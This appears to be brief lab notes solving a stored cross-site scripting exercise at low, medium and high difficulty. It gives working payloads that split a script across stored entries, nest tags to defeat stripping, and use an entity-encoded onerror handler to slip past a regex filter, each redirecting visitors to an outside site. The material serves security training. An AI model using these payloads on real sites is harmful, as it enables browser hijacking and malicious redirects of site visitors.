# XSS (Stored)

## low

```
<script>z="window.location.replace"</script>

<script>z+="('http://www.baidu.com')"</script>

<script>eval(z)</script>
```

## medium

length limitation is performed at frontend

```
<scr<script>ipt>window.location.replace("http://www.baidu.com")</script>
```

## high

bypass `preg_replace("s*c*r*p*t")`

```
<img src onerror="window.location.re&#112;lace('http://www.baidu.com')">
```
